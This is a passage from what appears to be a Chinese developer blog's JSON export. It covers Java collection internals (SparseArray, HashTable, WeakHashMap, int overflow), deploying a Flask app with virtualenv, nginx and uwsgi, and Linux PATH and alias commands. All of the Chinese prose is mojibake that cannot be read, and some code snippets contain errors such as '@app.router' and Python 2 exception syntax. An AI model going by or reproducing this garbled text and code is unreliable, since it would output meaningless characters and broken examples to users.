GrowingArrayUtils.insert(mValues, mSize, i, value); mSize++; } } // GrowwingArrayUtils.java /** * Primitive int version of {@link #insert(Object[], int, int, Object)}. */ public static int[] insert(int[] array, int currentSize, int index, int element) { assert currentSize &lt;= array.length; if (currentSize + 1 &lt;= array.length) { System.arraycopy(array, index, array, index + 1, currentSize - index); array[index] = element; return array; } int[] newArray = new int[growSize(currentSize)]; System.arraycopy(array, 0, newArray, 0, index); newArray[index] = element; System.arraycopy(array, index, newArray, index + 1, array.length - index); return newArray; } SparseArrayå»–ç¥œç§‹ ç‰¹åœ°å¼ºè°ƒ SparseArray æ˜¯é’ˆå¯¹HashMapåšçš„ä¼˜åŒ–ã€‚ 1.HashMap å†…éƒ¨çš„å­˜å‚¨ç»“æ„ï¼Œå¯¼è‡´ä¸€äº›å†…å­˜çš„æµªè´¹ã€‚ 2.åœ¨åˆšæ‰©å®¹å®Œï¼ŒSparseArray å’Œ HashMap éƒ½ä¼šå­˜åœ¨ä¸€äº›æ²¡è¢«åˆ©ç”¨çš„å†…å­˜ã€‚ SparseArray å¹¶ä¸æ˜¯ä»»ä½•æ—¶å€™éƒ½ä¼šæ›´å¿«ï¼Œæœ‰æ—¶åè€Œä¼šæ›´æ…¢vauleAtå’ŒkeyAtæ¥æ”¶ä¸€ä¸ªindexå‚æ•°(æ•°ç»„ä¸‹æ ‡)ï¼Œè¿™ä¸ªå‚æ•°åº”è¯¥æ˜¯keyå¯¹åº”çš„BinarySearchå¾—åˆ°çš„å€¼ã€‚ 2.4 ArrayMap2.5 HashTableçš„ä¸€äº›ç‚¹(è™½ç„¶å·²ç»ä¸æ¨èä½¿ç”¨äº†)HashTableçš„key,valueéƒ½ä¸å…è®¸ä¸ºnull /** * The maximum size of array to allocate. * Some VMs reserve some header words in an array. * Attempts to allocate larger arrays may result in * OutOfMemoryError: Requested array size exceeds VM limit */ private static final int MAX_ARRAY_SIZE = Integer.MAX_VALUE - 8; int index = (hash &amp; 0x7FFFFFFF) % tab.length; if (count &gt;= threshold) { // Rehash the table if the threshold is exceeded rehash(); } threshold = (int)Math.min(newCapacity * loadFactor, MAX_ARRAY_SIZE + 1); //æ‰€ä»¥è¿™ä¸ªloadFactorçš„æ„æ€å°±æ˜¯ï¼Œå¦‚æœsize(countå…¶å®å°±æ˜¯size)è¶…è¿‡äº†æ•°ç»„é•¿åº¦*0.75 ,å°±ä¼šæ‰©å®¹ã€‚ //æ‰€ä»¥å“ªæ€•æ‰€æœ‰çš„å…ƒç´ éƒ½æŒ‚åœ¨ç¬¬ä¸€ä¸ªEntryçš„å°¾å·´ä¸Šï¼Œsizeåˆ°äº†è¿™ä¸ªç¨‹åº¦ï¼Œä¹Ÿå¾—resizeã€‚è¿™ä¹Ÿæ˜¯hashMapåé¢æ”¹æˆæ ‘ç»“æ„çš„ä¸€éƒ¨åˆ†åŸå›  å› ä¸ºint æ˜¯signedçš„ï¼Œæ‰€ä»¥æœ€å¤§çš„å®¹é‡æ˜¯2çš„32æ¬¡æ–¹ï¼Œ20äº¿å·¦å³ï¼Œ2147483647ã€‚ä¸Šé¢çš„æ³¨é‡Šä¹Ÿè¯´æ˜äº†ï¼Œéƒ¨åˆ†vmå¯èƒ½ä¸å…è®¸allocateè¶…è¿‡20äº¿è¿™ä¸ªæ•°å­—ï¼Œæ‰€ä»¥å‡æ‰8ã€‚ ç”Ÿæˆæ•°ç»„ä¸‹æ ‡çš„æ–¹æ³•æ˜¯ç”¨(0x7FFFFFFFï¼Œå…¶å®å°±æ˜¯2çš„31æ¬¡æ–¹)è¿™ä¸ªæ•°å¯¹hashCodeè¿›è¡ŒæŒ‰ä½ä¸è¿ç®—ï¼Œå†å¯¹å½“å‰æ•°ç»„å–æ¨¡ã€‚è¿™é‡Œå¼ºè°ƒä¸€ç‚¹ï¼ŒhashCodeå¯ä»¥ä¸ºè´Ÿæ•°ã€‚è´Ÿæ•°æ˜¯æ€ä¹ˆæ¥çš„ï¼Œinteger overflowã€‚javaä¸­çš„overflowå¤§æ¦‚æ˜¯è¿™æ ·çš„ int dd1 = Integer.MAX_VALUE+1; int dd2 = Integer.MAX_VALUE+2; System.out.println(Integer.toBinaryString(Integer.MAX_VALUE)); // 1111111111111111111111111111111 //31ä¸ª1ï¼ˆå…¶å®å‰é¢è¿˜æœ‰ä¸€ä¸ª0ï¼‰ System.out.println(Integer.toBinaryString(dd1)); // 10000000000000000000000000000000 // 31ä¸ª0åŠ ä¸Šå°¾éƒ¨ä¸€ä¸ª1 System.out.println(Integer.toBinaryString(dd2)); // 10000000000000000000000000000001 // 1ä¸ª1 + ä¸­é—´30ä¸ª0 + å°¾éƒ¨1ä¸ª1 System.out.println(dd1&gt;Integer.MAX_VALUE); // false System.out.println(dd2&gt;dd1); // true æ‰€ä»¥åœ¨Int(32ä¸ªæ§½å­ï¼Œæœ€å¤š40å¤šäº¿çš„æ ·å­ï¼Œ0-20å¤šäº¿æ˜¯æ­£æ•°ï¼Œ30äº¿ï¼Œ40äº¿æ˜¯è´Ÿæ•°)ï¼Œlongä¹Ÿæ˜¯ç±»ä¼¼ã€‚å›åˆ°0x7FFFFFFF è¿™ä¸ªæ•°ï¼Œ&amp; æ“ä½œçš„ä½œç”¨å°±æ˜¯æŠŠå“ªäº›è¶…è¿‡20äº¿çš„ï¼ˆè´Ÿæ•°ï¼‰ï¼ŒæŠ¹æ‰ç¬¬ä¸€ä½çš„0ï¼Œä¹Ÿå°±æˆäº†æ­£æ•°ã€‚å¯¹äºä¸è¶…è¿‡é‚£ä¸ª20å¤šäº¿çš„æ•°ï¼ŒåŸæ ·è¿”è¿˜ã€‚ æ‰€ä»¥æ£€æµ‹ä¸¤ä¸ªInt ç›¸åŠ ä¼šä¸ä¼šoverflowçš„åŠæ³•æ˜¯è½¬æˆlongä¹‹åå†ç›¸åŠ  public static void main(String[] args) { int val1 = 9898989; int val2 = 6789054; System.out.println(&quot;Value1: &quot;+val1); System.out.println(&quot;Value2: &quot;+val2); long sum = (long)val1 + (long)val2; if (sum &gt; Integer.MAX_VALUE) { throw new ArithmeticException(&quot;Overflow!&quot;); } // displaying sum System.out.println(&quot;Sum: &quot;+(int)sum); } æ‰€ä»¥ArrayListé‡Œé¢å°±æœ‰è¿™ç§é˜²æ­¢æ‰©å®¹æ‰©åœ°å¤ªå¤§ï¼Œè¶…å‡ºäº†Integer.MAX_VALUEçš„æƒ…å†µï¼Œå…·ä½“æ¥è¯´ï¼Œå°±æ˜¯å¦‚æœArrayListçš„æ„é€ å‡½æ•°å¦‚æœä¼ å…¥äº†è¶…å‡º20äº¿å·¦å³çš„ä¸€ä¸ªint(æ¯”å¦‚è¯´30äº¿ï¼Œå…¶å®æ­¤æ—¶å·²ç»æ˜¯ä¸€ä¸ªè´Ÿæ•°äº†)ï¼Œç›´æ¥æŠ›å‡ºä¸€ä¸ªOutOfMemoryErrorã€‚ ä¸€ä¸ªæœ‰è¶£çš„ç°è±¡æ˜¯hashTableçš„rehashä¼šæŠŠæ¯ä¸ªEntryä¸Šçš„å…ƒç´ é¡ºåºé¢ å€’è¿‡æ¥ï¼Œä¾‹å¦‚(a-&gt;b-&gt;c-&gt;d)å˜æˆ(d-&gt;c-&gt;b-&gt;a)ã€‚ä¸è¿‡è¿™ä¸ªå±äºvmå®ç°çš„ç»†èŠ‚ã€‚ 3. Setçš„ä»‹ç»Setç”¨æ¯”è¾ƒå°‘ï¼ŒHashSetã€TreeSetå’ŒLinkedHashSetæ˜¯jdkçš„å®ç°ç±» public class HashSet extends AbstractSet implements Set, Cloneable, java.io.SerializableSetçš„é‡è¦ç‰¹ç‚¹å°±æ˜¯ä¸èƒ½æ”¾è¿›å»é‡å¤çš„å…ƒç´ ï¼ŒSetä¸­ä¸ä¼šå­˜åœ¨e1å’Œe2ï¼Œe1.equals(e2)çš„æƒ…å†µHashSetçš„æºç åªæœ‰ä¸‰ç™¾å¤šè¡Œï¼Œå†…éƒ¨æœ‰ä¸€ä¸ªmapï¼ˆHashMapï¼‰ç›¸å¯¹æ¥è¯´æ˜¯æ¯”è¾ƒç®€å•çš„ã€‚å…¶å®Setå¹³æ—¶ç”¨çš„ä¹Ÿä¸æ˜¯é‚£ä¹ˆå¤šã€‚ã€‚ã€‚ 4. ä¸€äº›ä¸å¸¸ç”¨çš„ç±»Vetor(ä¸è¦ç”¨)ï¼ŒStackï¼ŒArrayDeque,Queue, HashTableï¼ˆoracleä¸“å®¶å»ºè®®ä½¿ç”¨HashMapï¼‰,IdentityHashMap Vectorå±äºList,çº¿ç¨‹å®‰å…¨ï¼Œä½†æ•ˆç‡ä½ï¼ˆå°±æ˜¯ç®€å•çš„åœ¨æ‰€æœ‰æ–¹æ³•å‰é¢åŠ ä¸Šäº†synchronizedï¼‰ã€‚è€Œäº‹å®ä¸Šè¿™ç§åŒæ­¥ä¸èƒ½ä¿è¯å¤§æ‰¹é‡æ“ä½œçš„æ—¶å€™(putAll)çš„çº¿ç¨‹å®‰å…¨æ€§ï¼Œå¤–éƒ¨è°ƒç”¨è€…è¿˜å¾—ä¸“é—¨æä¸€æŠŠé”ã€‚ Queueæ˜¯ä¸€ä¸ªinterfaceï¼Œå±äºä¸¤ç«¯å¯ä»¥å‡ºå…¥çš„Listï¼Œé€šå¸¸æ˜¯(FIFOæ¨¡å¼)ï¼Œå®ç°ç±»æœ‰PriorityQueueï¼Œjava.util.concurrent.ArrayBlockingQueuejava.util.concurrent.LinkedBlockingQueuejava.util.concurrent.PriorityBlockingQueueä½œè€…éƒ½æ˜¯å¤§åé¼é¼çš„Doug Leaå¦å¤–ï¼ŒLinkedListä¹Ÿèƒ½ç›´æ¥æ‹¿æ¥å½“åšqueueä½¿ç”¨ Stackæ˜¯Vectorçš„å­ç±»(å±äºLIFOçš„æ ˆ)The Stack class represents a last-in-first-out (LIFO) stack of object Deque(åŒç«¯é˜Ÿåˆ—) 5. concurrentHashMapç­‰jdk1.8çš„concurrentHashMapä¸æ˜¯ç”¨synchronizedå®ç°çš„ï¼Œæ˜¯Doug Leaä½¿ç”¨CASæ“ä½œå†™çš„ï¼Œéå¸¸é«˜æ•ˆã€‚concurrentHashMapçš„åŸç†æ˜¯åˆ†æ®µé”(jdk 1.7)concurrentHashMapæ—©åœ¨1.7çš„æ—¶å€™å°±åŠ å…¥äº†putIfAbsentæ–¹æ³•ï¼Œå› ä¸ºç¡®å®éœ€è¦è¿™ç§atomic actionã€‚ ConcurrentLinkedQueue(tbd) 6. WeakHaskMapWeakHashMapçš„Keyæ˜¯WeakReferenceï¼Œä½†Valueä¸æ˜¯ã€‚å¸¸è§ç”¨æ³• String a = &quot;a&quot;; map.put(1,a); a = null; //mapä¸­çš„aå¯ä»¥å‡ºäº†mapè‡ªèº«å¤–æ²¡æœ‰å…¶ä»–åœ°æ–¹è¢«å¼•ç”¨ï¼Œaå°†è¢«è¢«gcå›æ”¶ Android å®˜æ–¹å¼€å‘æ–‡æ¡£ä¸ŠæŒ‡å‡ºäº†ä¸€ç‚¹ Implementation note: The value objects in a WeakHashMap are held by ordinary strong references. Thus care should be taken to ensure that value objects do not strongly refer to their own keys, either directly or indirectly, since that will prevent the keys from being discarded. Note that a value object may refer indirectly to its key via the WeakHashMap itself; that is, a value object may strongly refer to some other key object whose associated value object, in turn, strongly refers to the key of the first value object. If the values in the map do not rely on the map holding strong references to them, one way to deal with this is to wrap values themselves within WeakReferences before inserting, as in: m.put(key, new WeakReference(value)), and then unwrapping upon each get. WeakHashMapçš„valueä¸è¦æŒæœ‰keyçš„å¼ºå¼•ç”¨ï¼Œå¦åˆ™ï¼Œkeyæ°¸è¿œä¸ä¼šè¢«æ¸…é™¤,valueä¹Ÿåˆ«æƒ³è¢«æ¸…é™¤ã€‚ 7. java 8çš„ä¸€äº›æ–°çš„æ–¹æ³•list.replaceAll(String::toUpperCase) //method referencecan not change the element type, for that you need an streamCollections Refuled by Stuart MarksputIfAbsentæ˜¯Atomicçš„Is putIfAbsent an atomic operation 8.ç»“æŸè¯­8.1 Doug Lea æ˜¯éå¸¸èªæ˜çš„äººï¼Œå¹¶å‘ç»å¸¸ä¼šç‰µæ¶‰åˆ°é›†åˆï¼Œæ‰€ä»¥jdké‡Œé¢å¾ˆå¤šé›†åˆéƒ½æœ‰ä»–çš„ä½œå“8.2 jdkå®šä¹‰äº†map,Listè¿™æ ·çš„æ¥å£ï¼ŒåŒæ—¶æä¾›äº†æé«˜æ•ˆå®ç°ï¼Œä¿æŒäº†å¯æ‰©å±•æ€§ã€‚8.3 ArrayListå’ŒHashMapæ˜¯ä½¿ç”¨é¢‘ç‡æœ€é«˜çš„é›†åˆï¼Œå…·ä½“å†…éƒ¨å®ç°éå¸¸é‡è¦ã€‚8.6 Stackè¿™ç§ä¸œè¥¿æœ‰ç‚¹è¿‡æ—¶äº† ä¸€ä¸ªåŸå› æ˜¯Stack extends Vectorï¼ˆæ¯ä¸ªæ–¹æ³•éƒ½åŠ synchronizedï¼Œå¤šæ•°åœºæ™¯ä¸‹ä¸éœ€è¦ï¼Œå¦å¤–Vectoræ˜¯1.1è¿˜æ˜¯1.0å°±æœ‰äº†ï¼‰ updatejdk 1.8å¯¹äºé•¿åº¦è¶…è¿‡8çš„é“¾è¡¨æ”¹ç”¨çº¢é»‘æ ‘ã€‚jdk 1.8çš„ä¸€ä¸ªä¼˜åŒ–ç‚¹æ˜¯ArrayListå’ŒHashMapæ”¹æˆlazy initializedçš„äº†ï¼Œå°±æ˜¯åº•å±‚çš„arrayåªæœ‰åœ¨ç¬¬ä¸€æ¬¡putçš„æ—¶å€™æ‰å»allocateIdentityHashMapé‡‡ç”¨çš„æ˜¯probingç­–ç•¥ï¼Œå†…å­˜æ¶ˆè€—å°(æ²¡æœ‰EntryåŒ…è£…ï¼Œç›´æ¥å­˜çš„keyæ•°ç»„å’Œvalueæ•°ç»„)ï¼Œé€Ÿåº¦å¿«ï¼Œé€‚ç”¨äºidentity based key comparisonçš„æƒ…å†µ å‚è€ƒ Collections Refuled by Stuart Marks From Java Code to Java Heap: Understanding the Memory Usage of Your Application Javaé›†åˆå¹²è´§ç³»åˆ— Arrays.asList()è¿”å›çš„Listä¸æ˜¯jva.util.ArrayList WeakHashMapå’ŒHashMapçš„åŒºåˆ« Hashmapçš„æ­»é”é—®é¢˜ Young Pups: New Collections APIs for Java 9 by Stuart Marks CON6891 20 Years of APIs A Retrospective ã€Stuart Marks, Principal Member of Technical Staff, Oracleã€‘åæ€äº†javaå‘å±•çš„å†ç¨‹ï¼Œjavaçš„apiä¹Ÿå¹¶éå®Œç¾ï¼Œæ—©æœŸæœ‰äº›classå°±æ˜¯åŒ†åŒ†å¿™å¿™è®¾è®¡å‡ºæ¥çš„ï¼Œä½†ä¸ºäº†ä¸ç ´åbinary compatabilityï¼Œjavaä»æ¥æ²¡æœ‰ç§»é™¤è¿‡è¿™äº›ä¸é‚£ä¹ˆå®Œå–„çš„apiã€‚å®é™…ç”Ÿäº§ä¸­è¦é¿å…ä½¿ç”¨è¿™äº›ä¸æ¨èä½¿ç”¨çš„api,Data,Calendar,HashTable,Vectorã€‚ã€‚ã€‚","tags":[{"name":"java","slug":"java","permalink":"https://haldir65.github.io/tags/java/"}]},{"title":"åœ¨ubuntuæœåŠ¡å™¨ä¸Šéƒ¨ç½²wsgi application","date":"2017-06-25T22:46:23.000Z","path":"2017/06/25/2017-06-25-deploying-flask-app-on-linux-server/","text":"1. virtualenv å¥½ä¹ æƒ¯sudo pip install virtualenv sudo virtualenv venv source venv/bin/activate sudo pip install Flask ## virtualenvæŒ‡å®špythonç‰ˆæœ¬ virtualenv env --python=python2.7 virtualenv -p&quot;$(which python3.6)&quot; TEST ##linuxè¿™ä¸ªä¹Ÿè¡Œ mkvirtualenv --python=`which python3` &lt;env_name&gt; ## è¿™ä¸ªå±…ç„¶ä¹Ÿè¡Œ # sudo python __init__.py sudo /var/www/FlaskApp/FlaskApp/venv/bin/python2 __init__.py deactivate # exit Windowsç¯å¢ƒä¸‹å®‰è£…virtualenvç±»ä¼¼ åœ¨pycharmçš„cmdçª—å£ä¸­ï¼Œ æ‰§è¡Œpip install virtualenv virtualenv env #ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„ENVæ–‡ä»¶å¤¹ cd env /Scripts activate.bat # æ­¤æ—¶å…‰æ ‡å˜æˆ(env) &gt;. é€€å‡ºå¾ˆç®€å•deactivate.batå³å¯ macå’Œlinuxå¹³å°ä¸‹ source ./env/bin/activate 2. flask+nginx+wsgiDigital Oceanæ€»æœ‰å¾ˆå¤šå®ç”¨çš„æ•™ç¨‹,è·Ÿè¿™ä¸ªè¿™é‡Œé¢çš„æ•™ç¨‹å»éƒ¨ç½²flask appå¤šåŠä¼šç¢°åˆ°nginx 502ã€‚åŸå› æ˜¯ç”Ÿæˆçš„.sockæ–‡ä»¶çš„æƒé™ä¸å¯¹ï¼Œæ‰€ä»¥åœ¨iniæ–‡ä»¶é‡Œé¢åŠ ä¸Š chmod-socket = 666 åœ¨venvé‡Œé¢ä¸è¦ç”¨pip3ï¼Œç”¨pip wsgiåè®®çš„appè·‘èµ·æ¥ä¹‹åæ˜¯æ²¡æœ‰åŠæ³•ç›´æ¥é€šè¿‡httpå»è¯·æ±‚çš„ï¼Œè¦è®©nginxè½¬å‘ä¸€ä¸‹ã€‚ç”Ÿæˆçš„.sockæ–‡ä»¶å°±æ˜¯ç”¨æ¥å’Œnginxé€šä¿¡çš„ã€‚è¿™æ—¶å€™çš„åœ¨æµè§ˆå™¨é‡Œé¢è®¿é—®çš„portå°±æ˜¯nginxå†³å®šçš„äº†ã€‚wsgiçš„æ–‡æ¡£åº”è¯¥åœ¨pep-333é‡Œé¢ å¦å¤–ï¼Œé€šè¿‡uwsgiè·‘èµ·æ¥çš„æ‰˜ç®¡åœ¨Ngixnä¸Šçš„appå¦‚æœserverç«¯æŠ¥é”™çš„è¯ï¼Œå¯ä»¥sudo systemctl status yourservicefilename å»æŸ¥çœ‹å…·ä½“çš„æŠ¥é”™åŸå› ï¼Œæ¯”èµ·æœ¬åœ°å¼€å‘è¿˜æ˜¯éº»çƒ¦äº†ä¸€ç‚¹ç‚¹ 3. flaskçš„ä¸€å¤§å †extensionså®˜æ–¹åˆ—ä¸¾å‡ºçš„Extensionsæœ‰å¾ˆå¤š flask-jwt(ä¼¼ä¹å·²ç»å¾ˆä¹…æ²¡äººç»´æŠ¤äº†))from flask import Flask from flask_jwt import JWT, jwt_required, current_identity from werkzeug.security import safe_str_cmp class User(object): def __init__(self, id, username, password): self.id = id self.username = username self.password = password def __str__(self): return &quot;User(id=&#39;%s&#39;)&quot; % self.id users = [ User(1, &#39;user1&#39;, &#39;abcxyz&#39;), User(2, &#39;user2&#39;, &#39;abcxyz&#39;), ] username_table = {u.username: u for u in users} userid_table = {u.id: u for u in users} def authenticate(username, password): user = username_table.get(username, None) if user and safe_str_cmp(user.password.encode(&#39;utf-8&#39;), password.encode(&#39;utf-8&#39;)): return user def identity(payload): user_id = payload[&#39;identity&#39;] return userid_table.get(user_id, None) app = Flask(__name__) app.debug = True app.config[&#39;SECRET_KEY&#39;] = &#39;super-secret&#39; app.config[&#39;JWT_AUTH_HEADER_PREFIX&#39;] = &#39;awesome&#39; ##è®¾ç½®headerä¸­çš„Authorization: JWT xxxxxä¸­çš„JWTä¸‰ä¸ªå­— jwt = JWT(app, authenticate, identity) @app.route(&#39;/protected&#39;) @jwt_required() def protected(): return &#39;%s&#39; % current_identity if __name__ == &#39;__main__&#39;: app.run() ## è®¤è¯æ¥å£ curl -X POST http://127.0.0.1:5000/auth --header &quot;Content-Type:application/json&quot; --data &#39;{&quot;username&quot;:&quot;user1&quot;,&quot;password&quot;:&quot;abcxyz&quot;}&#39; ## { ## &quot;access_token&quot;: &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MzEyMTg0NTUsImlhdCI6MTUzMTIxODE1NSwibmJmIjoxNTMxMjE4MTU1LCJpZGVudGl0eSI6MX0.TPfb5Xwthbwnnf5P1LNB0o-CKiSis8VH0Db6JEotc9A&quot; ##} ##è®¿é—®éœ€è¦è®¤è¯çš„æ¥å£ ## curl -X GET http://127.0.0.1:5000/protected --header &quot;Content-Type:application/json&quot; --header &quot;Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MzEyMTg0NTUsImlhdCI6MTUzMTIxODE1NSwibmJmIjoxNTMxMjE4MTU1LCJpZGVudGl0eSI6MX0.TPfb5Xwthbwnnf5P1LNB0o-CKiSis8VH0Db6JEotc9A&quot; ## User(id=&#39;1&#39;) Flaskè®¾ç½®cookie: from flask import Flask,make_response,request app = Flask(__name__) @app.router(&#39;/setcookie&#39;) def setcookie(): resp = make_response(&#39;Setting cookies&#39;) resp.set_cookie(&#39;framework&#39;,&#39;flask&#39;) return resp @app.route(&#39;/getcookie&#39;) def getcookie(): framework = request.cookies.get(&#39;framework&#39;) return &#39;The frame work stored in cookie is &#39;+framework if __name__ == &quot;__main__&quot;: app.run(debug=True) è®¾ç½®headeræ¯”å¦‚corsè¿™ç§ä¹Ÿå¯ä»¥ @app.route(&quot;/&quot;) def home(): resp = flask.Response(&quot;Foo bar baz&quot;) resp.headers[&#39;Access-Control-Allow-Origin&#39;] = &#39;*&#39; return resp curl -i http://127.0.0.1:5000/your/endpoint å³å¯(iè¡¨ç¤ºinclude) flaskæ“ä½œæ•°æ®åº“mysql åœ¨windowsä¸‹è®¾ç½®ç¯å¢ƒå˜é‡è¦ç”¨set: (env) Î» set FLASK_APP=C:\\code\\realworld\\flask-realworld-example-app\\autoapp.py åå°å¼€å‘ç¯å¢ƒä¸­ç»å¸¸ä¼šå‡ºç°500é”™è¯¯ï¼Œè¿™ç§åå°appæŒ‚äº†çš„æƒ…å†µä¸€èˆ¬æš´éœ²ç»™å‰ç«¯çš„å“åº”éƒ½æ˜¯ä¸€ä¸ªç‰¹å®šçš„ç»“æ„ã€‚å®ç°æ–¹å¼çš„è¯ï¼šåœ¨flaskä¸­catch 500 error from flask import Flask ,url_for,render_template,request,abort from werkzeug.debug import get_current_traceback app = Flask(__name__) @app.route(&#39;/&#39;) def index(): try: raise Exception(&quot;Can&#39;t connect to database&quot;) except Exception,e: track= get_current_traceback(skip=1, show_hidden_frames=True, ignore_system_exceptions=False) track.log() abort(500) return &quot;index&quot; @app.route(&#39;/url&#39;) def my_method(): try: call_method_that_raises_exception() except Exception as e: render_template(&quot;500.html&quot;, error = str(e)) @app.errorhandler(500) def internal_server_error(error): app.logger.error(&#39;Server Error: %s&#39;, (error)) return render_template(&#39;500.htm&#39;), 500 @app.errorhandler(Exception) def unhandled_exception(e): app.logger.error(&#39;Unhandled Exception: %s&#39;, (e)) return render_template(&#39;500.htm&#39;), 500 if __name__== &quot;__main__&quot;: app.run(debug=True) äº‹å®ä¸Šï¼Œ4XXçš„erroræ˜¯ä¼šèµ°åˆ°ç”¨æˆ·æ³¨å†Œçš„errorhandlerä¸­çš„ï¼Œä½†æ˜¯åœ¨debugæ¨¡å¼ä¸‹ï¼Œä¸ä¼šèµ°åˆ°5XXçš„errorhandlerä¸‹é¢ã€‚æ‰€ä»¥ç”Ÿäº§ç¯å¢ƒä¸‹é¦–å…ˆç¡®ä¿debugå…³é—­ï¼Œç„¶åæ‰€æœ‰çš„é”™è¯¯éƒ½ä¼šèµ°åˆ°5xxçš„errorhandlerä¸‹é¢ Reference how-to-deploy-a-flask-application-on-an-ubuntu-vps","tags":[{"name":"python","slug":"python","permalink":"https://haldir65.github.io/tags/python/"}]},{"title":"linuxå¸¸ç”¨å‘½ä»¤æ‰©å±•","date":"2017-06-18T16:51:49.000Z","path":"2017/06/18/2017-06-18-linux-commands-extended/","text":"ä¸€äº›linuxçš„å¸¸ç”¨å‘½ä»¤ï¼Œlinuxç¯å¢ƒä¸‹è¿è¡Œserver ,bashçš„è¯­æ³• é€ŸæŸ¥ æ¸…ç†å¤§æ–‡ä»¶ 1. å¸¸ç”¨è½¯ä»¶å®‰è£…utorrentapache,mysqlæ²¡äº‹ä¸è¦æ‰‹è´±å‡çº§è½¯ä»¶ apt-get -u upgrade //å°±åƒè¿™æ ·ï¼ŒstableæŒºå¥½çš„sudo apt updatesudo apt full-upgrade ## æ›´æ–°æ‰€æœ‰è½¯ä»¶ 2. ç¯å¢ƒå˜é‡æ€ä¹ˆæ”¹(è¿™ä¸ªæœ‰ä¸´æ—¶æ”¹å’Œæ°¸ä¹…ç”Ÿæ•ˆä¸¤ç§)ä¸´æ—¶æ”¹ï¼ˆä¸‹æ¬¡ç™»å½•å¤±æ•ˆè¿™ç§ï¼‰export PATH=$PATH:/home/directory/to/the/folderecho $PATH ## çœ‹ä¸‹æ”¹å¥½æ²¡ export FLASK_DEBUG=1$FLASK_DEBUG &gt;&gt; 1 æ°¸ä¹…ç”Ÿæ•ˆï¼ˆè°¨æ…ä¸ºä¹‹ï¼‰ä¿®æ”¹/etc/profileæ–‡ä»¶ï¼šï¼ˆå¯¹æ‰€æœ‰ç”¨æˆ·éƒ½ç”Ÿæ•ˆï¼‰export PATH=â€$PATH:/home/directory/to/the/folderâ€ ä¿®æ”¹~/.bashrcæ–‡ä»¶ï¼š ï¼ˆå¯¹å½“å‰ç”¨æˆ·æœ‰æ•ˆï¼‰export PATH=â€$PATH:/home/directory/to/the/folderâ€ æ³¨ï¼š åœ¨windowsä¸‹exportè¦æ¢æˆset,echo $XXX è¦æ¢æˆecho %XXX% è¿™ä¸ªæœ‰æ•ˆä¸€èˆ¬éƒ½éœ€è¦é‡æ–°æ³¨é”€ç³»ç»Ÿæ‰èƒ½ç”Ÿæ•ˆ setå¯ä»¥æŸ¥çœ‹å½“å‰ç”¨æˆ·æœ¬åœ°shellè®¾ç½®çš„æ‰€æœ‰å˜é‡ï¼Œç”¨unsetå¯ä»¥å–æ¶ˆå˜é‡: setunset $SOME_PROGRAM å¹³æ—¶åœ¨shellä¸­è¾“å…¥sudo XXX ,ç³»ç»Ÿæ˜¯å¦‚ä½•çŸ¥é“æ€ä¹ˆæ‰§è¡Œè¿™æ¡æŒ‡ä»¤çš„å‘¢ã€‚é¦–å…ˆï¼Œå¯ä»¥æŸ¥çœ‹which XXX ï¼Œç”¨äºæŸ¥æ‰¾æŸé¡¹æŒ‡ä»¤å¯¹åº”çš„æ–‡ä»¶çš„ä½ç½®ã€‚è€Œåƒsudoè¿™ç§éƒ½æ”¾åœ¨PATHä½ç½®ï¼Œç³»ç»Ÿä¼šåœ¨å‡ ä¸ªå…³é”®ä½ç½®æŸ¥æ‰¾sudoå‘½ä»¤ã€‚ç”¨æˆ·æœ¬èº«å®Œå…¨å¯ä»¥åˆ›å»ºä¸€ä¸ªå«åšsudoçš„æ–‡ä»¶chmod+X ï¼Œç„¶åè¿è¡Œè¿™ä¸ªsudoã€‚ æŸ¥çœ‹PATH : echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games (æ³¨æ„ï¼Œç³»ç»Ÿæ˜¯æŒ‰ç…§è¿™ä¸ªé¡ºåºæ‰¾çš„ï¼Œå¦‚æœåœ¨ç¬¬ä¸€ä¸ªç›®å½•ä¸‹æ‰¾åˆ°ä¸€ä¸ªå«sudoçš„ä¸œè¥¿ï¼Œå°±ä¼šç›´æ¥æ‰§è¡Œäº†ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯æœ‰æ½œåœ¨çš„å±é™©çš„) çœ‹ä¸‹å“ªä¸ªå‘½ä»¤å¯¹åº”çš„ä½ç½®åœ¨å“ªé‡Œ which XXXk æ¯”å¦‚sudo å°±æ”¾åœ¨ /usr/bin/sudo $PATH ç¯å¢ƒå˜é‡ä¿®æ”¹åœ¨~./bashrcæˆ–è€… ~./profileé‡Œé¢ å…·ä½“æ¥è¯´ï¼Œæ¯”å¦‚è¦æŠŠ/etc/apache/binç›®å½•æ·»åŠ åˆ°PATHä¸­ PATH=$PATH:/etc/apache/bin #åªå¯¹æœ¬æ¬¡ä¼šè¯æœ‰æ•ˆ æˆ–è€… PATH=$PATH:/etc/apache/bin #åœ¨~./bashrcæˆ–è€…~./profileé‡Œé¢æ·»åŠ è¿™å¥è¯ æ¯”å¦‚æŠŠfacebook çš„buckæ·»åŠ åˆ°ç¯å¢ƒå˜é‡ï¼š $ cd ~ $ vim ~/.bash_profile export PATH=$HOME/buck/bin:$PATH $ source ~/.bash_profile ## ç«‹åˆ»ç”Ÿæ•ˆ é¡ºä¾¿è¯´ä¸‹widnowsä¸‹æ€ä¹ˆçœ‹ç¯å¢ƒå˜é‡ï¼š echo %path% æ€ä¹ˆæŸ¥çœ‹æœ¬æœºç¯å¢ƒå˜é‡printenv 3. aliasè®¾ç½®æŸ¥çœ‹å·²ç»è®¾ç½®è¿‡çš„aliasï¼š aliasæˆ–è€… alias -pvi ä¸­è¾“å…¥ /XXX å¯ä»¥æœç´¢ vi ~/.bashrc ## è¿™ä¸ªæ˜¯å¯¹å½“å‰ç”¨æˆ·ç”Ÿæ•ˆçš„ /etc/bashrc å†™åˆ°æ–‡ä»¶è¿™é‡Œé¢æ˜¯å¯¹æ‰€æœ‰ç”¨æˆ·ç”Ÿæ•ˆ alias yourcommand=&#39;ls -alr&#39; ##æ·»åŠ è¿™ä¸€è¡Œï¼ŒåŸæ¥çš„å‘½ä»¤ä¹Ÿç…§æ ·ç”¨ é‡å¼€sessionå³å¯ç”Ÿæ•ˆæ€¥ç€è¦æƒ³é©¬ä¸Šç”Ÿæ•ˆå¯ä»¥source ~/.bashrc ## 